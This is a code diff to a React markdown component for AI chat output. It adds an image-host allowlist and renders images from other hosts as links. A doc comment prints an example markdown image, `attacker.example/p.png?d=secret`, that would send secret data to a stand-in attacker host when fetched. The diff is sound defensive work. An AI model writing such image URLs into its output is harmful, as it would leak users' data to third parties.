@@ -1,9 +1,10 @@
 'use client';
 
-import { memo, useMemo, type ReactNode } from 'react';
+import { createContext, memo, useContext, useMemo, type ReactNode } from 'react';
 import ReactMarkdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import remend from 'remend';
+import { ImageIcon } from './lib/icons';
 import { CodeLines, CopyButton } from './lib/primitives';
 import { cn } from './lib/utils';
 
@@ -125,6 +126,53 @@ function CodeBlock({ children }: { children?: ReactNode }) {
   );
 }
 
+const NO_HOSTS: readonly string[] = [];
+/** Hosts images may load from (see `MarkdownProps.allowedImageHosts`). */
+const ImageHostsContext = createContext(NO_HOSTS);
+
+function isAllowedImage(src: string, hosts: readonly string[]): boolean {
+  if (hosts.includes('*')) return true;
+  try {
+    // Relative and protocol-relative URLs have no base here, so they throw and are blocked.
+    const url = new URL(src);
+    return (
+      (url.protocol === 'https:' || url.protocol === 'http:') &&
+      hosts.some((host) => [url.hostname, url.host].includes(host.toLowerCase()))
+    );
+  } catch {
+    return false;
+  }
+}
+
+const linkClass =
+  'text-aui-accent-fg decoration-aui-accent/40 hover:decoration-aui-accent focus-visible:outline-aui-ring font-medium underline underline-offset-2 transition-colors focus-visible:outline-2 focus-visible:outline-offset-1';
+
+/**
+ * Images load only from allowed hosts: fetching a URL the model wrote can leak data to a third
+ * party (`![](https://attacker.example/p.png?d=secret)`). Other images render as a link instead.
+ */
+function MarkdownImage({ src, alt, title }: { src: string; alt?: string | undefined; title?: string | undefined }) {
+  const hosts = useContext(ImageHostsContext);
+  // Unsafe protocols, and images that are still streaming, arrive with an empty URL.
+  if (!src) return alt ? <>{alt}</> : null;
+  if (isAllowedImage(src, hosts)) {
+    return <img src={src} alt={alt ?? ''} title={title} className="my-2 inline-block max-w-full rounded-lg" />;
+  }
+  const external = /^https?:\/\//.test(src);
+  return (
+    <a
+      href={src}
+      title={title}
+      className={cn(linkClass, 'inline-flex items-baseline gap-1')}
+      {...(external ? { target: '_blank', rel: 'noopener noreferrer' } : {})}
+    >
+      <ImageIcon size={13} className="shrink-0 self-center" />
+      <span className="sr-only">Image: </span>
+      {alt || 'image'}
+    </a>
+  );
+}
+
 function normalizeLanguage(lang: string) {
   const map: Record<string, string> = {
     typescript: 'ts',
@@ -196,10 +244,7 @@ const components: Components = {
     return (
       <a
         href={href}
-        className={cn(
-          'text-aui-accent-fg decoration-aui-accent/40 hover:decoration-aui-accent focus-visible:outline-aui-ring font-medium underline underline-offset-2 transition-colors focus-visible:outline-2 focus-visible:outline-offset-1',
-          className,
-        )}
+        className={cn(linkClass, className)}
         {...(external ? { target: '_blank', rel: 'noopener noreferrer' } : {})}
         {...props}
       >
@@ -218,6 +263,9 @@ const components: Components = {
     />
   ),
   pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
+  img: ({ node: _node, src, alt, title }) => (
+    <MarkdownImage src={typeof src === 'string' ? src : ''} alt={alt} title={title} />
+  ),
   table: ({ node: _node, className, ...props }) => (
     <div className="border-aui-border my-3 overflow-x-auto rounded-lg border">
       <table className={cn('w-full text-left text-[13px]', className)} {...props} />
@@ -251,6 +299,12 @@ export interface MarkdownProps {
   citations?: number;
   /** Must match the `idPrefix` of the `Sources` the citations point to. Default "source". */
   citationPrefix?: string;
+  /**
+   * Hosts that images may load from, e.g. `['images.example.com', 'localhost:3000']` (exact
+   * host names of http(s) URLs); `'*'` allows every image. Default: none. A URL in model output can leak data when the
+   * browser fetches it, so other images render as links and nothing is requested.
+   */
+  allowedImageHosts?: readonly string[] | undefined;
   components?: Components;
   className?: string;
 }
@@ -258,13 +312,15 @@ export interface MarkdownProps {
 /**
  * Streaming-safe markdown (GFM). While `streaming`, unterminated emphasis, code
  * and links are closed before parsing so partial output never flashes raw syntax.
- * Raw HTML is not rendered and URLs are sanitized.
+ * Raw HTML is not rendered, links and images with unsafe protocols (`javascript:`,
+ * `data:`) are stripped, and images load only from `allowedImageHosts`.
  */
 export const Markdown = memo(function Markdown({
   children,
   streaming = false,
   citations = 0,
   citationPrefix = 'source',
+  allowedImageHosts,
   components: overrides,
   className,
 }: MarkdownProps) {
@@ -287,14 +343,16 @@ export const Markdown = memo(function Markdown({
       data-slot="markdown"
       className={cn('font-aui-sans text-aui-fg text-[14.5px] leading-[1.7] [overflow-wrap:anywhere]', className)}
     >
-      <ReactMarkdown
-        // Plugin tuples are typed loosely by unified; the shapes above are correct.
-        remarkPlugins={remarkPlugins as never}
-        rehypePlugins={rehypePlugins as never}
-        components={merged}
-      >
-        {text}
-      </ReactMarkdown>
+      <ImageHostsContext value={allowedImageHosts ?? NO_HOSTS}>
+        <ReactMarkdown
+          // Plugin tuples are typed loosely by unified; the shapes above are correct.
+          remarkPlugins={remarkPlugins as never}
+          rehypePlugins={rehypePlugins as never}
+          components={merged}
+        >
+          {text}
+        </ReactMarkdown>
+      </ImageHostsContext>
     </div>
   );
 });
